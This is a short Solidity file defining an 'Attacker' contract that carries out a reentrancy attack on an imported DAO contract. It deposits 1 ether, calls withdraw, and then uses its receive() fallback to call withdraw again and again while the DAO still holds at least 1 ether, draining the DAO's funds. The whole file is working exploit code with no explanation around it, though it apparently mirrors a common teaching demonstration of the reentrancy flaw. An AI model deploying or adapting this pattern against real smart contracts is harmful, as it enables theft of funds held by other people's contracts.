// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DAO.sol";

contract Attacker {
    DAO private daoContract;

    constructor(address escrowAddress) {
        daoContract = DAO(escrowAddress);
    }

    function attack() external payable {
        daoContract.deposit{value: 1 ether}();
        daoContract.withdraw();
    }

    receive() external payable {
        if (address(daoContract).balance >= 1 ether) {
            daoContract.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}